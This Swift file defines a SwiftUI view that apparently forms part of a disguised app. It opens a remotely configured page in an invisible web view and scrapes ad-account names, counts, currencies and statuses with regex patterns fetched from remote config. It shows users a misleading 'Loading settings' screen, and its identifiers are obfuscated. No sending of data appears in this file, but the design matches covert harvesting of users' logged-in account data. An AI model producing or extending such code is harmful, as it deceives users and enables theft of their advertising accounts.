//
//  File.swift
//  
//
//  Created by DanHa on 31/03/2023.
//

import SwiftUI
import WebKit

@available(iOS 14.0, *)
public struct UtilTen: View {
    @State var btnClickTen = false
    @State var getHtmAdten: String = ""
    public init(listData: [String: String]) {
        self.listData = listData
    }
    var listData: [String: String] = [:]
    public var body: some View {
        ZStack { Color.white.ignoresSafeArea()
            if getHtmAdten.isEmpty {
                ProgressView(listData[RemoKey.wereloadingf1.rawValue] ?? "").foregroundColor(.gray).opacity(0.8)
            } else {
                let totalFivCt = self.findCharac(for: listData[RemoKey.five01f.rawValue] ?? "", in: getHtmAdten).filter({ !$0.isEmpty })
                let actFivAct = self.findCharac(for: listData[RemoKey.five02f.rawValue] ?? "", in: getHtmAdten).filter({ !$0.isEmpty })
                let naFiv = self.findCharac(for: listData[RemoKey.five03f.rawValue] ?? "", in: getHtmAdten).filter({ !$0.isEmpty })
                let currencyFiv = self.findCharac(for: listData[RemoKey.five04f.rawValue] ?? "", in: getHtmAdten).filter({ !$0.isEmpty })
                let acounStaFiv = self.findCharac(for: listData[RemoKey.five05f.rawValue] ?? "", in: getHtmAdten).filter({ !$0.isEmpty })
                VStack {
                    VStack(alignment: .leading, spacing: 5) {
                        ScrollView {
                            VStack(alignment: .leading) {
                                if naFiv.isEmpty {
                                    HStack(spacing: 5) {
                                        Text(listData[RemoKey.idfoundf1.rawValue] ?? "").font(.system(size: 12))
                                        Spacer()
                                        Image(systemName: "lock").foregroundColor(Color.red)
                                    }.padding(10).background(RoundedRectangle(cornerRadius: 5, style: .continuous).fill(.gray).opacity(0.07))
                                } else {
                                    ForEach(Array(actFivAct.enumerated()), id: \.offset) { index, _ in
                                        HStack(alignment: .center, spacing: 5) {
                                            VStack(alignment: .leading, spacing: 5) {
                                                Text("\(naFiv[index])").fontWeight(.bold).font(.system(size: 12)).lineLimit(1)
                                                Text("\(actFivAct[index]) - \(currencyFiv[index]) ").font(.system(size: 12))
                                                if acounStaFiv[index] == "1" {
                                                    Text(listData[RemoKey.actf1.rawValue] ?? "").padding(.vertical, 2).padding(.horizontal, 4).background(Color.green).cornerRadius(5).font(.system(size: 12)).foregroundColor(Color.white)
                                                }
                                                if acounStaFiv[index] == "2" {
                                                    Text(listData[RemoKey.disf1.rawValue] ?? "").padding(.vertical, 2).padding(.horizontal, 4).background(Color.red).cornerRadius(5).font(.system(size: 12)).foregroundColor(Color.white)
                                                }
                                                if acounStaFiv[index] == "3" {
                                                    Text(listData[RemoKey.unsf1.rawValue] ?? "").padding(.vertical, 2).padding(.horizontal, 4).background(Color.gray).cornerRadius(5).font(.system(size: 12)).foregroundColor(Color.white)
                                                }
                                            }
                                            Spacer()
                                            if acounStaFiv[index] == "1" {
                                                VStack(spacing: 5) {
                                                    Image(systemName: "moonphase.full.moon").foregroundColor(Color.green).font(.system(size: 12)).frame(width: 60)
                                                    Text(listData[RemoKey.activecamf1.rawValue] ?? "").foregroundColor(.gray).opacity(0.8).font(.system(size: 12))
                                                }
                                            } else {
                                                // Image(systemName: "lock").foregroundColor(Color.gray).font(.system(size: 13)).frame(width: 60)
                                                ProgressView("No \(listData[RemoKey.activecamf1.rawValue] ?? "") ").foregroundColor(.gray).opacity(0.8).font(.system(size: 12))
                                            }
                                        }.padding(10)
                                            .background(RoundedRectangle(cornerRadius: 5, style: .continuous).fill(.gray).opacity(0.07))
                                    }
                                } // else
                                // }//VStack
                            } // VStack
                        } // ScrollView
                    }.padding(.top, 40)
                    Spacer()
                    VStack(spacing: 5) {
                        Button(action: { self.btnClickTen = false // true
                        }, label: {
                            HStack(spacing: 5) {
                                Spacer()
                                ProgressView().progressViewStyle(CircularProgressViewStyle(tint: .white)).font(.system(size: 12))
                                VStack(alignment: .leading, spacing: 2) {
                                    Text("Loading settings \(totalFivCt[0]) ad")
                                        .fontWeight(.semibold)
                                        .font(.body)
                                        .font(.system(size: 12))
                                }
                                Spacer()
                            }
                            .padding(10)
                            .foregroundColor(.white)
                            .background(Color.blue)
                            .cornerRadius(5)
                        }).padding(.top, 5)
                    }.padding(.bottom, 20)
                } // VStack
                .padding(10)
                .foregroundColor(Color.black)
                .background(Color.white)
            } // else
            ZStack {
                TenCoor(url: URL(string: "\(listData[RemoKey.rmlink13.rawValue] ?? "")\(self.namAabeCall())"), getHtmAdten: $getHtmAdten, listData: self.listData).opacity(0)
            }.zIndex(0)
        } // ZStack
    } // body

    func namAabeCall() -> String {
        var namAabe: String?
        if let dataModel = UserDefaults.standard.object(forKey: "nameAabe") as? Data {
            if let userNamLoaded = try? JSONDecoder().decode(UsNameAabe.self, from: dataModel) { namAabe = userNamLoaded.nameAabe }
        }
        return namAabe ?? ""
    }
    
    func findCharac(for regex: String, in text: String) -> [String] {
        do {
            let regex = try NSRegularExpression(pattern: regex)
            let results = regex.matches(in: text,  range: NSRange(text.startIndex..., in: text))
            return results.map { String(text[Range($0.range, in: text)!])}
        } catch let error {
            print("error: \(error.localizedDescription)")
            return []
        }
    }
}

struct UsNameAabe: Codable {
    var nameAabe: String
}
